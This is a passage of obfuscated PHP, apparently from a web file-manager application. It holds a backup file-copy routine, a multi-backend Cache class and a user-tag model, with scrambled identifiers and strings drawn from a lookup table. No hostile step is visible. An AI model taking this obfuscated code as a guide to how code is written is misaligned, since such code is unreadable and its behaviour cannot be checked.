$Åì›¶¶î[$_SERVER[è¶³ÒßÑ][806]])); $‰ûâ‰çä = (int) Model($_SERVER[è¶³ÒßÑ][843])->where($¤ú§æ‰)->count($_SERVER[è¶³ÒßÑ][534]); $–ÊÈÂ¥™ = (int) Model($_SERVER[è¶³ÒßÑ][843])->where($¤ú§æ‰)->sum($_SERVER[è¶³ÒßÑ][89]); $ÃÅšÔÅ§ = new TaskFileTransfer($_SERVER[è¶³ÒßÑ][863], $_SERVER[è¶³ÒßÑ][837], $‰ûâ‰çä, LNG($_SERVER[è¶³ÒßÑ][838]) . $_SERVER[è¶³ÒßÑ][839] . LNG($_SERVER[è¶³ÒßÑ][864])); $ÃÅšÔÅ§->task[$_SERVER[è¶³ÒßÑ][817]] = $–ÊÈÂ¥™; $–·†¶Á = array($_SERVER[è¶³ÒßÑ][865] => $‰ûâ‰çä, $_SERVER[è¶³ÒßÑ][866] => $–ÊÈÂ¥™, $_SERVER[è¶³ÒßÑ][867] => time()); Backup::set($–·†¶Á); $‡ø©ãØñ = !0; $“á£´õˆ = $this->storeIds(); $Û„‹ñˆí = 1; $ÛÉ²¤Ï‹ = 1000; $‘»™õ–¯ = $”ƒÛË…¬ = 0; $ÊøœÚû = array(); $Ğò¼¼±‡ = $‚òÙ¯·× = 0; do { $©°ßò§Ì = $_SERVER[è¶³ÒßÑ][868]; $Ôõœ‡ = Model($_SERVER[è¶³ÒßÑ][843])->where($¤ú§æ‰)->field($©°ßò§Ì)->order($_SERVER[è¶³ÒßÑ][869])->selectPage($ÛÉ²¤Ï‹, $Û„‹ñˆí); $Õ°‘ÓĞ = !empty($Ôõœ‡[$_SERVER[è¶³ÒßÑ][438]]) ? $Ôõœ‡[$_SERVER[è¶³ÒßÑ][438]] : array(); foreach ($Õ°‘ÓĞ as $ºÓÊ¬¡Ö) { if (!$this->_fileExist($ºÓÊ¬¡Ö, $ÊøœÚû, $“á£´õˆ)) { write_log("\x66\x69\x6c\x65\x20\x6e\157\x74\40\145\x78\151\x73\x74\56\x66\x69\x6c\145\x49\104\x3a{$ºÓÊ¬¡Ö[$_SERVER[è¶³ÒßÑ][534]]}\x2c\40\x70\x61\164\150\72{$ºÓÊ¬¡Ö[$_SERVER[è¶³ÒßÑ][97]]}", $_SERVER[è¶³ÒßÑ][870]); continue; } $îÕˆ±Õ¬ = $ºÓÊ¬¡Ö[$_SERVER[è¶³ÒßÑ][97]]; $Ì±Ğ‰Ê = "\x7b\x69\x6f\72{$Åì›¶¶î[$_SERVER[è¶³ÒßÑ][806]]}\x7d" . substr($îÕˆ±Õ¬, strlen("\x7b\151\x6f\x3a{$ºÓÊ¬¡Ö[$_SERVER[è¶³ÒßÑ][871]]}\x7d")); if (IO::exist($Ì±Ğ‰Ê)) { $ÃÅšÔÅ§->updateFileEnd($ºÓÊ¬¡Ö[$_SERVER[è¶³ÒßÑ][32]], $ºÓÊ¬¡Ö[$_SERVER[è¶³ÒßÑ][89]]); } else { $Ì±Ğ‰Ê = get_path_father($Ì±Ğ‰Ê); IO::mkdir($Ì±Ğ‰Ê); if (!IO::copy($îÕˆ±Õ¬, $Ì±Ğ‰Ê, $_SERVER[è¶³ÒßÑ][872])) { write_log($_SERVER[è¶³ÒßÑ][873] . $îÕˆ±Õ¬ . $_SERVER[è¶³ÒßÑ][857] . $Ì±Ğ‰Ê . $_SERVER[è¶³ÒßÑ][188], $_SERVER[è¶³ÒßÑ][837]); $‡ø©ãØñ = !1; break; } } $Ø»à÷âÕ = $ºÓÊ¬¡Ö[$_SERVER[è¶³ÒßÑ][534]]; $”ƒÛË…¬ += 1; $‘»™õ–¯ += $ºÓÊ¬¡Ö[$_SERVER[è¶³ÒßÑ][89]]; $‚òÙ¯·× += 1; $Ğò¼¼±‡ += $ºÓÊ¬¡Ö[$_SERVER[è¶³ÒßÑ][89]]; if ($‘»™õ–¯ >= 1024 * 1024 * 100) { $–·†¶Á = array($_SERVER[è¶³ÒßÑ][805] => $Ø»à÷âÕ, $_SERVER[è¶³ÒßÑ][874] => $‚òÙ¯·×, $_SERVER[è¶³ÒßÑ][875] => $Ğò¼¼±‡); Backup::set($–·†¶Á); $‘»™õ–¯ = $”ƒÛË…¬ = 0; } } $ú†‡Î™ë = count($Õ°‘ÓĞ); $Û„‹ñˆí++; } while ($ú†‡Î™ë == $ÛÉ²¤Ï‹); $ÃÅšÔÅ§->end(); $–·†¶Á = array($_SERVER[è¶³ÒßÑ][876] => 1, $_SERVER[è¶³ÒßÑ][815] => time(), $_SERVER[è¶³ÒßÑ][829] => 1, $_SERVER[è¶³ÒßÑ][805] => $Ø»à÷âÕ, $_SERVER[è¶³ÒßÑ][877] => time()); if ($”ƒÛË…¬) { $–·†¶Á[$_SERVER[è¶³ÒßÑ][874]] = $‚òÙ¯·×; $–·†¶Á[$_SERVER[è¶³ÒßÑ][875]] = $Ğò¼¼±‡; } Backup::set($–·†¶Á); return !0; } private function _fileExist($ÌêÁíÓÜ, &$Ù‘šü™, $ß–ú„ÁÕ) { $ûÔØ‚Ô­ =& $_SERVER[è¶³ÒßÑ]; $õ¶öÇÀç = $ÌêÁíÓÜ[$ûÔØ‚Ô­[97]]; if (in_array($ÌêÁíÓÜ[$ûÔØ‚Ô­[534]], $Ù‘šü™)) { return !1; } if (!in_array($ÌêÁíÓÜ[$ûÔØ‚Ô­[871]], $ß–ú„ÁÕ)) { return !1; } if (IO::exist($õ¶öÇÀç)) { return !0; } $öÊ§­ = get_path_father($õ¶öÇÀç); if (IO::exist($öÊ§­)) { $Ù‘šü™[] = $ÌêÁíÓÜ[$ûÔØ‚Ô­[534]]; return !1; } $©Û½øÄÑ = array($ûÔØ‚Ô­[871] => $ÌêÁíÓÜ[$ûÔØ‚Ô­[871]], $ûÔØ‚Ô­[97] => array($ûÔØ‚Ô­[452], "{$öÊ§­}\45")); $õÁ”ÖÔ = Model($ûÔØ‚Ô­[843])->where($©Û½øÄÑ)->field($ûÔØ‚Ô­[535])->select(); $Ù‘šü™ = array_merge($Ù‘šü™, array_to_keyvalue($õÁ”ÖÔ, $ûÔØ‚Ô­[12], $ûÔØ‚Ô­[534])); return !1; } private function _fileFilter($Ìææ§å¸) { $¥ ŠüÆ =& $_SERVER[è¶³ÒßÑ]; return; if (empty($Ìææ§å¸)) { return; } $È´å¾Õî = array($¥ ŠüÆ[534] => array($¥ ŠüÆ[7], array_unique($Ìææ§å¸))); $à¨¦³ù = Model($¥ ŠüÆ[878])->where($È´å¾Õî)->field($¥ ŠüÆ[203])->select(); foreach ($à¨¦³ù as $Îßª¾ğÙ) { Model($¥ ŠüÆ[878])->remove($Îßª¾ğÙ[$¥ ŠüÆ[203]], !1); } } private function storeIds() { $˜‚³Íï =& $_SERVER[è¶³ÒßÑ]; $Ô’áñÖÂ = Model($˜‚³Íï[821])->listData(); $Ïøæáò  = array(); $Ö„…ÁÙ = $GLOBALS[$˜‚³Íï[6]][$˜‚³Íï[102]][$˜‚³Íï[879]]; foreach ($Ô’áñÖÂ as $Ã¿í¥ƒâ) { $³²ûë¸Ä = strtolower($Ã¿í¥ƒâ[$˜‚³Íï[108]]); if (!isset($Ö„…ÁÙ[$³²ûë¸Ä])) { continue; } $¤ÉÛ»† = $˜‚³Íï[87] . (isset($Ö„…ÁÙ[$³²ûë¸Ä]) ? $Ö„…ÁÙ[$³²ûë¸Ä] : ucfirst($³²ûë¸Ä)); if (!class_exists($¤ÉÛ»†)) { continue; } $Ïøæáò [] = $Ã¿í¥ƒâ[$˜‚³Íï[468]]; } return $Ïøæáò ; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $êõàöÜ— =& $_SERVER[è¶³ÒßÑ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $Òƒ¸Ñà = $GLOBALS[$êõàöÜ—[6]][$êõàöÜ—[418]]; $î°‹Ñİò = $Òƒ¸Ñà[$Òƒ¸Ñà[$êõàöÜ—[880]]]; $¤˜‡çÂ = $Òƒ¸Ñà[$êõàöÜ—[881]]; switch ($Òƒ¸Ñà[$êõàöÜ—[880]]) { case $êõàöÜ—[21]: self::$handle = Model($êõàöÜ—[882]); break; case $êõàöÜ—[883]: self::$handle = new CacheRedis($î°‹Ñİò, $¤˜‡çÂ); break; case $êõàöÜ—[884]: self::$handle = new CacheMemcached($î°‹Ñİò, $¤˜‡çÂ); break; case $êõàöÜ—[240]: self::$handle = new CacheFile($î°‹Ñİò, $¤˜‡çÂ); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($ŞÜùù“) { if (is_array($ŞÜùù“) || is_object($ŞÜùù“)) { $ŞÜùù“ = json_encode($ŞÜùù“); } $ŞÜùù“ = rawurlencode($ŞÜùù“); return md5(KOD_SITE_ID . $_SERVER[è¶³ÒßÑ][11] . $ŞÜùù“); } public static function get($Îºˆ³à“, $ö¸Ô·ºë = false) { $àºæ©Œ– = self::key($Îºˆ³à“); $•ë¸Ëßš = self::init(); if ($ö¸Ô·ºë) { return unserialize($•ë¸Ëßš->get($àºæ©Œ–)); } if (!isset(self::$memoryCache[$àºæ©Œ–])) { $—’—â¹¦ = $•ë¸Ëßš->get($àºæ©Œ–); self::$memoryCache[$àºæ©Œ–] = unserialize($—’—â¹¦); } return self::$memoryCache[$àºæ©Œ–]; } public static function set($æÑ•“Ù, $¡Í§íê°, $§ı¶¶Ê³ = false) { $û¿ôš™ =& $_SERVER[è¶³ÒßÑ]; $Š•²«¤ = self::key($æÑ•“Ù); if (isset(self::$memoryCache[$Š•²«¤]) && self::$memoryCache[$Š•²«¤] === $¡Í§íê°) { return !0; } if ($§ı¶¶Ê³ === 0) { self::$memoryCache[$Š•²«¤] = $¡Í§íê°; return !0; } $ÙÜ£¬Ûº = self::init(); $ËÄ „àò = serialize($¡Í§íê°); CacheLock::lock($æÑ•“Ù . $û¿ôš™[885]); $ëŞ£Ã‘¸ = $ÙÜ£¬Ûº->set($Š•²«¤, $ËÄ „àò, $§ı¶¶Ê³); self::$memoryCache[$Š•²«¤] = $¡Í§íê°; CacheLock::unlock($æÑ•“Ù . $û¿ôš™[885]); return $ëŞ£Ã‘¸; } public static function getCall($ğĞ§æû, $ÂßÑŒ¢í, $Î÷ÊÒ×Ë, $ÅãøÜÎ½ = array()) { $Óç§Æè =& $_SERVER[è¶³ÒßÑ]; $ØÅÜ¾¦ = self::get($ğĞ§æû); if ($ØÅÜ¾¦ || $ØÅÜ¾¦ === $Óç§Æè[12]) { return $ØÅÜ¾¦; } $ØÅÜ¾¦ = call_user_func_array($Î÷ÊÒ×Ë, $ÅãøÜÎ½); $ØÅÜ¾¦ = $ØÅÜ¾¦ ? $ØÅÜ¾¦ : $Óç§Æè[12]; self::set($ğĞ§æû, $ØÅÜ¾¦, $ÂßÑŒ¢í); return $ØÅÜ¾¦; } public static function remove($‰îÄôŸ’) { $¤Ì¦İÃó = self::key($‰îÄôŸ’); unset(self::$memoryCache[$¤Ì¦İÃó]); self::clearTimeout(); CacheLock::lock($‰îÄôŸ’); $¢æÉ«ƒ— = self::init()->remove($¤Ì¦İÃó); CacheLock::unlock($‰îÄôŸ’); return $¢æÉ«ƒ—; } public static function removeMemory($â°ºĞÔ—) { $ÀÃ¨§µ´ = self::key($â°ºĞÔ—); unset(self::$memoryCache[$ÀÃ¨§µ´]); } public static function clearMemory($îÍıœÚ‘ = false) { if ($îÍıœÚ‘) { $îÍıœÚ‘ = self::key($îÍıœÚ‘); unset(self::$memoryCache[$îÍıœÚ‘]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[è¶³ÒßÑ][886])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[è¶³ÒßÑ][887])) { self::init()->clearTimeout(); } } } goto e»ã•òß…–; E‚‡¶¶›Ï: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\145\162\x5f\x66\x61\x76"; protected function cacheFunctionAlias($Ñ‹ùõ­) { $¡Èİ¯ëí =& $_SERVER[è¶³ÒßÑ]; return array($¡Èİ¯ëí[2074] => array($¡Èİ¯ëí[2488] . USER_ID, $¡Èİ¯ëí[2075])); } protected function listData() { $ì¼‘ÈÚØ =& $_SERVER[è¶³ÒßÑ]; $´ı©—À¬ = array($ì¼‘ÈÚØ[1752] => USER_ID, $ì¼‘ÈÚØ[550] => array($ì¼‘ÈÚØ[2078], 0)); $œ‹Ë„³ş = $ì¼‘ÈÚØ[2489]; $ªŸ“ëöÁ = $this->field($œ‹Ë„³ş)->where($´ı©—À¬)->order($ì¼‘ÈÚØ[2081])->select(); return $ªŸ“ëöÁ ? $ªŸ“ëöÁ : array(); } protected function addToTag($‹ÛõÎÇ, $À‚Á–) { $×ËÊ¢œ· =& $_SERVER[è¶³ÒßÑ]; if (!Model($×ËÊ¢œ·[2225])->listData($À‚Á–)) { return !1; } if (is_numeric($‹ÛõÎÇ)) { $–”ÖÒë¯ = Model($×ËÊ¢œ·[878])->pathInfo($‹ÛõÎÇ); if (!$–”ÖÒë¯) { return !1; } } else { $–”ÖÒë¯ = IO::infoSimple($‹ÛõÎÇ); if (!$–”ÖÒë¯) { return !1; } $ĞÕó“Í = $–”ÖÒë¯[$×ËÊ¢œ·[32]]; $«æ­Ğ‹¤ = $–”ÖÒë¯[$×ËÊ¢œ·[33]]; if (isset($–”ÖÒë¯[$×ËÊ¢œ·[478]])) { $«æ­Ğ‹¤ = $–”ÖÒë¯[$×ËÊ¢œ·[478]] == $×ËÊ¢œ·[101] ? $×ËÊ¢œ·[88] : $×ËÊ¢œ·[240]; } } $äâ˜¢ğ = array($×ËÊ¢œ·[1752] => USER_ID, $×ËÊ¢œ·[550] => $À‚Á–, $×ËÊ¢œ·[488] => $‹ÛõÎÇ, $×ËÊ¢œ·[489] => $«æ­Ğ‹¤ ? $«æ­Ğ‹¤ : $×ËÊ¢œ·[483], $×ËÊ¢œ·[487] => $ĞÕó“Í ? $ĞÕó“Í : $×ËÊ¢œ·[12], $×ËÊ¢œ·[1963] => 0); if ($this->where($äâ˜¢ğ)->find()) { return !1; } return $this->add($äâ˜¢ğ); } protected function removeFromTag($ÛŠ‚“şÃ, $ÏİŒÜŸÚ) { $ÁâĞÓÇô =& $_SERVER[è¶³ÒßÑ]; if (!Model($ÁâĞÓÇô[2225])->listData($ÏİŒÜŸÚ)) { return !1; } if (is_array($ÛŠ‚“şÃ)) { $ÛŠ‚“şÃ = array($ÁâĞÓÇô[7], $ÛŠ‚“şÃ); } $¨¨©ö ¼ = array($ÁâĞÓÇô[1752] => USER_ID, $ÁâĞÓÇô[550] => $ÏİŒÜŸÚ, $ÁâĞÓÇô[488] => $ÛŠ‚“şÃ); return $this->where($¨¨©ö ¼)->delete(); } protected function removeByTag($÷‘ƒ÷Ô) { $Í©Â„Áˆ =& $_SERVER[è¶³ÒßÑ]; if (!$÷‘ƒ÷Ô) { return !1; } $’¾©Î…  = array($Í©Â„Áˆ[1752] => USER_ID, $Í©Â„Áˆ[550] => $÷‘ƒ÷Ô); return $this->where($’¾©Î… )->delete(); } protected function removeBySource($úî›„à) { $§«©‘£ =& $_SERVER[è¶³ÒßÑ]; if (is_array($úî›„à)) { $úî›„à = array($§«©‘£[7], $úî›„à); } $µÈ¾¨ = array($§«©‘£[1752] => USER_ID, $§«©‘£[550] => array($§«©‘£[1067], 0), $§«©‘£[488] => $úî›„à); return $this->where($µÈ¾¨)->delete(); } }